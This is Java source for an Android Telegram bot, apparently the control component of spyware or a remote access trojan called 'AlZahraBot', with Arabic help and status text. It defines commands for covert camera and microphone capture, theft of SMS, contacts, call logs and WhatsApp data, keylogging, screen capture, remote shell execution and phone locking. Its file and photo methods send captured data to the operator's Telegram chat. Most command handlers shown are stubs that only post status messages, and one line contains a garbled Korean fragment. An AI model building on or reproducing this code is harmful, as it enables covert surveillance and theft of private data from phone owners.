package com.alzahra.telegram;

import android.util.Log;

import org.json.JSONObject;
import org.telegram.telegrambots.bots.TelegramLongPollingBot;
import org.telegram.telegrambots.meta.api.methods.send.SendDocument;
import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
import org.telegram.telegrambots.meta.api.methods.send.SendPhoto;
import org.telegram.telegrambots.meta.api.methods.updatingmessages.EditMessageText;
import org.telegram.telegrambots.meta.api.objects.InputFile;
import org.telegram.telegrambots.meta.api.objects.Update;
import org.telegram.telegrambots.meta.exceptions.TelegramApiException;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class TelegramArabicBot extends TelegramLongPollingBot {
    private static final String TAG = "TelegramBot";
    private final String botToken;
    private final String chatId;

    private static final String CMD_HELP = "/help";
    private static final String CMD_DEVICE = "/device";
    private static final String CMD_LOCATION = "/location";
    private static final String CMD_CAMERA = "/camera";
    private static final String CMD_MIC = "/mic";
    private static final String CMD_SMS = "/sms";
    private static final String CMD_CONTACTS = "/contacts";
    private static final String CMD_CALLS = "/calls";
    private static final String CMD_APPS = "/apps";
    private static final String CMD_SHELL = "/shell";
    private static final String CMD_SCREEN = "/screen";
    private static final String CMD_HTTPSMS = "/httpsms";
    private static final String CMD_KEYBOARD = "/keyboard";
    private static final String CMD_PHLOCK = "/phlock";
    private static final String CMD_PHUNLOCK = "/phunlock";
    private static final String CMD_RESTART = "/restart";
    private static final String CMD_SHUTDOWN = "/shutdown";
    private static final String CMD_WHATSAPP = "/whatsapp";
    private static final String CMD_LOCKNOW = "/locknow";
    private static final String CMD_UNLOCKNOW = "/unlocknow";

    public TelegramArabicBot(String token, String chat) {
        this.botToken = token;
        this.chatId = chat;
    }

    @Override
    public String getBotUsername() {
        return "AlZahraBot";
    }

    @Override
    public String getBotToken() {
        return botToken;
    }

    @Override
    public void onUpdateReceived(Update update) {
        if (!update.hasMessage() || !update.getMessage().hasText()) return;
        
        String messageText = update.getMessage().getText();
        Long userId = update.getMessage().getChatId();
        
        if (!String.valueOf(userId).equals(chatId)) {
            sendText(userId, "⛔ غير مصرح لك!");
            return;
        }

        handleCommand(messageText, userId);
    }

    private void handleCommand(String cmd, Long chatId) {
        switch (cmd.split(" ")[0]) {
            case CMD_HELP:
                sendHelp(chatId);
                break;
            case CMD_DEVICE:
                sendText(chatId, "📱 معلومات الجهاز");
                break;
            case CMD_LOCATION:
                sendText(chatId, "🗺️ يرجى الانتظار...");
                break;
            case CMD_CAMERA:
                sendText(chatId, "📸 جاري التقاط الصورة...");
                break;
            case CMD_MIC:
                sendText(chatId, "🎤 جاري تسجيل الصوت (5 ثوانٍ)...");
                break;
            case CMD_SMS:
                sendText(chatId, "💬 جاري استخراج الرسائل...");
                break;
            case CMD_CONTACTS:
                sendText(chatId, "👥 جاري استخراج جهات الاتصال...");
                break;
            case CMD_CALLS:
                sendText(chatId, "📞 جاري استخراج سجل المكالمات...");
                break;
            case CMD_APPS:
                sendText(chatId, "📦 جاري استخراج التطبيقات...");
                break;
            case CMD_SCREEN:
                sendText(chatId, "📺 جاري التقاط الشاشة...");
                break;
            case CMD_HTTPSMS:
                sendText(chatId, "📡 جاري اعتراض رسائل HTTP...");
                break;
            case CMD_KEYBOARD:
                sendText(chatId, "⌨️ كيبورد 경logger نشط");
                break;
            case CMD_PHLOCK:
                sendText(chatId, "🔒 جاري قفل الشاشة...");
                break;
            case CMD_PHUNLOCK:
                sendText(chatId, "🔓 جاري فتح الشاشة...");
                break;
            case CMD_RESTART:
                sendText(chatId, "🔄 جاري إعادة تشغيل الجهاز...");
                break;
            case CMD_SHUTDOWN:
                sendText(chatId, "⛽ جاري إيقاف الجهاز...");
                break;
            case CMD_WHATSAPP:
                sendText(chatId, "💬 جاري استخراج واتساب...");
                break;
            default:
                sendText(chatId, "❓ أمر غير معروف. اكتب /help للمساعدة");
        }
    }

    private void sendHelp(Long chatId) {
        String help = "🤖 *بوت الزهراء المتقدم v3.0*\n\n" +
            "📋 *الأوامر الأساسية:*\n" +
            "/device - معلومات الجهاز\n" +
            "/location - الموقع الجغرافي\n" +
            "/camera - التقاط صورة\n" +
            "/mic - تسجيل صوت\n\n" +
            "📱 *جمع البيانات:*\n" +
            "/sms - الرسائل\n" +
            "/contacts - جهات الاتصال\n" +
            "/calls - سجل المكالمات\n" +
            "/apps - التطبيقات المثبتة\n\n" +
            "🛠️ *التحكم المتقدم:*\n" +
            "/screen - لقطة الشاشة\n" +
            "/shell - تنفيذ أوامر\n" +
            "/phlock - قفل الهاتف\n" +
            "/phunlock - فتح الهاتف\n" +
            "/restart - إعادة التشغيل\n" +
            "/shutdown - إيقاف الجهاز\n";
        sendText(chatId, help);
    }

    public void sendText(Long chatId, String text) {
        try {
            if (chatId == null) chatId = Long.parseLong(this.chatId);
            execute(new SendMessage(String.valueOf(chatId), text));
        } catch (TelegramApiException e) {
            Log.e(TAG, "Send text error: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Error: " + e.getMessage());
        }
    }

    public void sendWelcomeMessage(String deviceModel, String deviceId) {
        try {
            String msg = "🎉 *تم تفعيل البوت بنجاح!*\n\n" +
                "📱 الجهاز: " + deviceModel + "\n" +
                "🔑 المعرف: " + deviceId + "\n" +
                "⏰ الوقت: " + java.text.DateFormat.getDateTimeInstance().format(new java.util.Date()) + "\n\n" +
                "✅ استخدم /help لعرض الأوامر المتاحة";
            execute(new SendMessage(chatId, msg));
        } catch (Exception e) {
            Log.e(TAG, "Welcome error: " + e.getMessage());
        }
    }

    public boolean sendFile(byte[] data, String filename, String caption) {
        try {
            InputFile file = new InputFile(new ByteArrayInputStream(data), filename);
            SendDocument doc = new SendDocument(chatId, file);
            doc.setCaption(caption);
            execute(doc);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Send file error: " + e.getMessage());
            return false;
        }
    }

    public boolean sendPhoto(byte[] data, String caption) {
        try {
            InputFile file = new InputFile(new ByteArrayInputStream(data), "photo.jpg");
            SendPhoto photo = new SendPhoto(chatId, file);
            photo.setCaption(caption);
            execute(photo);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Send photo error: " + e.getMessage());
            return false;
        }
    }
}
